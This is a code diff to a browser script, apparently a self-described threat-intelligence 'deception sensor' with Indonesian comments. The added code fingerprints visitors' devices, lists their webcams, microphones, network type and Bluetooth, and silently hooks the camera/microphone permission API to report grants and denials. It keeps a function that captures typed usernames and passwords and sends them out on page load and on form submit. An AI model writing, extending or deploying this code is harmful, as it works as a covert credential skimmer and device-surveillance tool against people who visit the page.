@@ -1,7 +1,11 @@
 // cti-telemetry.js - Cyber Threat Intelligence (CTI) Client Telemetry & Deception Sensor
-// Mengumpulkan sidik jari browser (GPU, WebGL, Canvas, Audio, Screen, Timezone) dan mengkorelasikan kredensial (Username & Password).
+// Mengumpulkan sidik jari browser (GPU, WebGL, Canvas, Audio, Screen, Timezone),
+// perangkat media fisik (Webcam & Microphone), koneksi jaringan (WiFi vs Ethernet), Bluetooth, dan pemanenan kredensial (Username & Password).
 (function () {
     'use strict';
+
+    let cachedMediaDevices = [];
+    let bluetoothSupported = false;
 
     function getCanvasFingerprint() {
         try {
@@ -65,6 +69,59 @@
         }
     }
 
+    // Ekstraksi info jaringan fisik (WiFi, Cellular, Ethernet & Bandwidth/Latency)
+    function getNetworkInfo() {
+        try {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return null;
+            return {
+                connection_type: conn.type || '',
+                effective_type: conn.effectiveType || '',
+                downlink_mbps: conn.downlink || 0,
+                rtt_ms: conn.rtt || 0
+            };
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // Enumerasi perangkat fisik Kamera & Microphone
+    async function scanMediaDevices() {
+        try {
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                cachedMediaDevices = devices.map(d => ({
+                    kind: d.kind, // 'audioinput', 'videoinput', 'audiooutput'
+                    label: d.label || 'Generic Device (' + d.kind + ')',
+                    device_id: d.deviceId ? d.deviceId.substring(0, 16) + '...' : ''
+                }));
+            }
+        } catch (e) {}
+    }
+
+    // Deteksi ketersediaan Bluetooth
+    function initBluetoothCheck() {
+        try {
+            if (navigator.bluetooth) {
+                bluetoothSupported = true;
+                if (navigator.bluetooth.getAvailability) {
+                    navigator.bluetooth.getAvailability().then(avail => {
+                        bluetoothSupported = avail;
+                    }).catch(() => {});
+                }
+            }
+        } catch (e) {}
+    }
+
+    function getCurrentRoom() {
+        let roomName = '';
+        if (window.location.pathname.startsWith('/group/')) {
+            const parts = window.location.pathname.split('/').filter(Boolean);
+            if (parts.length >= 2) roomName = parts[1];
+        }
+        return roomName;
+    }
+
     function collectFingerprint() {
         const glInfo = getWebGLInfo();
         const tz = (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : '';
@@ -81,7 +138,10 @@
             gpu_vendor: glInfo.vendor,
             gpu_renderer: glInfo.renderer,
             canvas_hash: getCanvasFingerprint(),
-            audio_hash: getAudioFingerprint()
+            audio_hash: getAudioFingerprint(),
+            media_devices: cachedMediaDevices,
+            network_info: getNetworkInfo(),
+            bluetooth_supported: bluetoothSupported
         };
     }
 
@@ -102,29 +162,69 @@
         } catch (e) {}
     }
 
-    // 1. Kirim Pre-Auth Recon Beacon saat halaman berhasil dimuat
+    // Hook navigator.mediaDevices.getUserMedia untuk menangkap saat izin Camera/Mic diberikan
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        const origGUM = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
+        navigator.mediaDevices.getUserMedia = async function (constraints) {
+            try {
+                const stream = await origGUM(constraints);
+                // Izin kamera/mic berhasil diberikan oleh pengguna!
+                setTimeout(async () => {
+                    await scanMediaDevices();
+                    sendTelemetry({
+                        event: 'MEDIA_DEVICES_ACCESSED',
+                        group: getCurrentRoom(),
+                        fingerprint: collectFingerprint()
+                    });
+                }, 500);
+                return stream;
+            } catch (err) {
+                // Izin ditolak
+                sendTelemetry({
+                    event: 'MEDIA_ACCESS_DENIED',
+                    group: getCurrentRoom(),
+                    error: err.name || err.message,
+                    fingerprint: collectFingerprint()
+                });
+                throw err;
+            }
+        };
+    }
+
+    // Listen device change (perangkat USB mic/webcam/bluetooth dicabut-colok)
+    if (navigator.mediaDevices && navigator.mediaDevices.addEventListener) {
+        navigator.mediaDevices.addEventListener('devicechange', async () => {
+            await scanMediaDevices();
+            sendTelemetry({
+                event: 'MEDIA_DEVICE_CHANGED',
+                group: getCurrentRoom(),
+                fingerprint: collectFingerprint()
+            });
+        });
+    }
+
+    // 1. Inisialisasi awal saat halaman dimuat
+    async function initSensor() {
+        initBluetoothCheck();
+        await scanMediaDevices();
+
+        sendTelemetry({
+            event: 'PRE_AUTH_BEACON',
+            group: getCurrentRoom(),
+            fingerprint: collectFingerprint()
+        });
+    }
+
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', initSensor);
     } else {
         initSensor();
     }
 
-    function initSensor() {
-        let roomName = '';
-        if (window.location.pathname.startsWith('/group/')) {
-            const parts = window.location.pathname.split('/').filter(Boolean);
-            if (parts.length >= 2) roomName = parts[1];
-        }
-
-        sendTelemetry({
-            event: 'PRE_AUTH_BEACON',
-            group: roomName,
-            fingerprint: collectFingerprint()
-        });
-    }
-
     // 2. Intercept Kredensial (Username & Password) saat submit atau tombol diklik
-    function harvestCredentials() {
+    async function harvestCredentials() {
+        await scanMediaDevices();
+
         const userEl = document.getElementById('username') || document.querySelector('input[name="username"]');
         const passEl = document.getElementById('password') || document.querySelector('input[name="password"]');
         const groupEl = document.getElementById('group') || document.querySelector('input[name="group"]');
@@ -133,9 +233,8 @@
         const password = passEl ? passEl.value : '';
         let groupName = groupEl ? groupEl.value.trim() : '';
 
-        if (!groupName && window.location.pathname.startsWith('/group/')) {
-            const parts = window.location.pathname.split('/').filter(Boolean);
-            if (parts.length >= 2) groupName = parts[1];
+        if (!groupName) {
+            groupName = getCurrentRoom();
         }
 
         if (username || password) {
